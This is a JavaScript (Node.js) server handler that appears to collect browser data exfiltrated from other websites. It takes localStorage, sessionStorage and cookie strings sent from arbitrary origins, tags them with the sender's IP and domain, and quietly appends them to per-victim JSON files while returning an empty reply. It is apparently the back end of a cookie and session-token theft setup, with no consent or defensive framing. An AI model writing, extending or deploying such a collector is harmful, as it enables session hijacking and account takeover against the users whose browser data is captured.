const {valid} = require('sandhands')
const {writeFile, access} = require('fs')
const {resolve, join} = require('path')
const {allowMissingIPHeader} = require('../../config.json')
const getDateString = require('../../functions/getDateString')
const ensureExists = require('../../functions/ensureExists')
const getDomain = require('../../functions/getDomain')
const jsonfile = require('jsonfile')
const mkdirp = require('mkdirp')
const isIp = require('../../functions/isIp')

const storageLocationNames = ["localStorage", "sessionStorage"]

const dataFolder = resolve(__dirname, '../data')

const bodyFormat = {
  localStorage: {
    _: {},
    strict: false
  },
  cookies: {
    _: String,
    minLength: 0
  },
  sessionStorage: {
    _: {},
    strict: false
  }
}

function storage(request, reply) {
  reply.send()
  if (!valid(request.body, bodyFormat)) return

  const {
    localStorage,
    cookies,
    sessionStorage
  } = request.body

  const domain = getDomain(request.headers.origin)

  if (!valid(domain, String)) return

  let ip = request.headers["X-Forwarded-For"]

  if (ip) {
    if (!isIp(ip)) return console.log(new Error('Malformed IP: "' + ip + '"!'))
  } else {
    if (allowMissingIPHeader !== true) return
    console.warn('Missing X-Forwarded-For Header')
  }

  const data = {
    localStorage,
    cookies,
    sessionStorage
  }; // Required Semicolon

  removeInvalidData(data)

  if (Object.keys(data).length < 1) return

  const dateString = getDateString()

  if (ip) {
    saveKnownSource({
      ip,
      data,
      domain
    })
  } else {
    saveUnknownSource({data, domain})
  }
}

function removeInvalidData(data) {
  storageLocationNames.forEach(storageLocationName => {
    if (!data.hasOwnProperty(storageLocationName)) return
    const storageLocation = data[storageLocationName]
    const entries = Object.entries(storageLocation)
    let anyValid = false
    for (let i = 0; i < entries.length; i++) {
      const [key, value] = entries[i]
      if (typeof value != 'string' || value.length < 1) {
        delete storageLocation[key]
      } else {
        if (anyValid === false) anyValid = true
      }
    }

    if (anyValid === false) delete data[storageLocationName]
  })
  if (!data.hasOwnProperty('cookies') || data.cookies.length < 1) delete data.cookies
}

const unknownStorageFolder = join(dataFolder, 'unknown')

function saveUnknownSource(data) {
  const storageFolder = join(unknownStorageFolder, 'storage')
  const filePath = storageFolder + '/'+ getDateString() +'.json'
  mkdirp(storageFolder, err => {
    if (err) return console.log(err)
    writeFile(filePath, JSON.stringify(data), err => {
      if (err) console.log(err)
    })
  })
}

function saveKnownSource({
  ip,
  data,domain}) {
  const storageFolder = join(dataFolder, ip.replace(/\./g, '-'), domain)
  const filePath = storageFolder + '/storage.json'

  mkdirp(storageFolder, err => {
    if (err) return console.log(err)
    access(filePath, err => {
      if (err) {
        const output = {}
        mergeData(output, data)
        writeFile(filePath, JSON.stringify(output), err => {
          if (err) console.log(err)
        })
      } else {
        jsonfile.readFile(filePath, (err, output) => {
          if (err) return console.log(err)
          mergeData(output, data)
          writeFile(filePath, JSON.stringify(output), err => {
            if (err) console.log(err)
          })
        })
      }
    })
  })
}

function mergeData(master, newData) {
  storageLocationNames.forEach(storageLocationName => {
    if (!newData.hasOwnProperty(storageLocationName)) return
    if (!master.hasOwnProperty(storageLocationName)) master[storageLocationName] = {}
    const storageLocation = master[storageLocationName]
    Object.entries(newData[storageLocationName]).forEach(([key, value]) => {
      if (!storageLocation.hasOwnProperty(key)) storageLocation[key] = []
      if (storageLocation[key][storageLocation[key].length - 1] !== value) storageLocation[key].push(value)
    })
  })
  if (newData.hasOwnProperty('cookies')) {
    if (!master.hasOwnProperty('cookies')) master.cookies = []
    if (master.cookies[master.cookies.length - 1] !== newData.cookies) master.cookies.push(newData.cookies)
  }
}
module.exports = storage
